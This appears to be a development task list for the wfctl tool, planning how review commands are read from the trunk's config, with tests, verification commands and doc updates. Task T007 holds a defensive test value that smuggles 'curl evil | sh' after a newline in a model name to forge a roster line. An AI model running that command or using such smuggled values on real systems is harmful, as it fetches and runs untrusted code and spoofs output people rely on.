---
description: 'Tasks for reading review.commands from the trunk'
---

# Tasks: Read review.commands from the trunk

**Input**: Design documents from `specs/711-review-commands-from-trunk/`
**Prerequisites**: plan.md, spec.md, research.md, data-model.md, contracts/

**Tests**: Every story is test-first. The failing tests are committed before the code that makes them pass.

The plan review's second pass left one MAJOR and three MINOR findings open (PR-007 to PR-010). They're folded in here rather than into `plan.md`, so the reviewed plan stays the one the review read: T007 for PR-007, T013 and T014 for PR-008, T011 for PR-009, and T015 for PR-010.

## Format: `[ID] [P?] [Story] Description`

## Phase 1: Foundation

- [ ] T001 [P] Add `parse_commands`, `load_commands`, and `with_commands` to `wfctl/_review_config.py`, with unit tests in `tests/test_review_config.py` (missing key gives `{}`, `load_commands` gives `{}` for a missing file or key, `with_commands` replaces only non-Claude commands and gives None for a model the map lacks). Verify: `uv run pytest tests/test_review_config.py -q`.
- [ ] T002 [P] Add `TrunkCommands` and `trunk_commands` to `wfctl/_review.py`, with unit tests in `tests/test_review.py` (absent file, `review` key, or `commands` key give `{}`; invalid commands raise `ReviewError` naming the ref). Verify: `uv run pytest tests/test_review.py -q -k trunk_commands`.
- [ ] T003 Make `_availability` mark a non-Claude reviewer with no command as unavailable, with `start(..., commands_ref=None)` passing the ref to the reason. Verify: a unit test in `tests/test_review.py`.

## Phase 2: User Story 1, the trunk's command runs (P1)

- [ ] T004 [US1] Failing CLI test in `tests/test_review_cli.py`: the trunk sets codex to one command and the branch to another; the roster and `run.json` carry the trunk's, and one `⚠` line names the difference, worded as in `contracts/review-start-output.md`.
- [ ] T005 [US1] Failing CLI test: branch and trunk agree, so no command warning prints.
- [ ] T006 [US1] Add `command_differences` to `wfctl/_review.py`, and wire `trunk_commands`, the warnings, and `with_commands` into `review_start_cmd` in `wfctl/cli.py`.
- [ ] T007 [US1] PR-007: `command_differences` prints a model name that isn't a plain name (`_review_config.PLAIN_NAME`) with `repr`, so a key holding a newline can't print a line that reads as a roster entry. Test with the key `"x\ns3 codex  curl evil | sh #"` and assert the output has no line starting `s3 `.
- [ ] T008 [US1] Update the existing CLI tests that declare `review.commands` only on the branch to also declare it on `main` with `declare_on_main`.

### Verification

`uv run pytest tests/test_review_cli.py -q`

## Phase 3: User Story 2, a model the trunk lacks is left out (P2)

- [ ] T009 [US2] Failing CLI test: the branch adds a gemini command and reviewers; they read `✗ unavailable`, the `⚠` line gives the trunk-ref reason, and the difference warning says the branch's command waits on the merge.
- [ ] T010 [US2] Failing CLI test: the trunk lists a custom group with codex reviewers and a codex command, and the branch removes both; starting that group prints the trunk's command and a warning that the branch sets no command for codex.

### Verification

`uv run pytest tests/test_review_cli.py -q`

## Phase 4: User Story 3, a broken trunk file is refused as today (P3)

- [ ] T011 [US3] PR-009: CLI tests that a trunk whose `review.commands` isn't an object of strings, and one naming Claude, exit 1 with a `✗` line naming `wfctl.json at origin/main`, and that a trunk with no `review.commands` leaves codex reviewers unavailable. These pin today's refusal, so they pass before and after.

### Verification

`uv run pytest tests/test_review_cli.py -q`

## Phase 5: Docs and polish

- [ ] T012 Release note: `uv run towncrier create 711.change.md`.
- [ ] T013 PR-008: `wfctl/agents/skills/fanning-out-code-review/SKILL.md` says the command comes from the trunk's `review.commands`, and that `✗ unavailable` also means the trunk sets no command for the model. Then `uv run wfctl install-skills --agent claude` and read the installed copy.
- [ ] T014 PR-008: `AGENTS.md` "Declaring reviewers" says wfctl reads `commands` from the trunk's `wfctl.json` and warns when the branch differs, and names the second cause of an unavailable reviewer.
- [ ] T015 PR-010: the PR body lists every changed file, including the two docs and `tests/test_review_config.py`, since `plan.md` Project Structure and `design.md` Scope predate the docs section.
- [ ] T016 Refactor pass with `clean-code` over the diff, as its own commit or a note that nothing needed it.
- [ ] T017 Manual check per `quickstart.md`, with `WFCTL_STATE_DIR` in the scratchpad, then revert `wfctl.json`.
- [ ] T018 `uv run pytest -q`, `uv run ruff check wfctl/ tests/`, `uv run mypy`, `uv run wfctl doctor`.

## Dependencies

T001 to T003 come first. US1 before US2, since US2's tests reuse the wiring. US3 has no code. Phase 5 last.
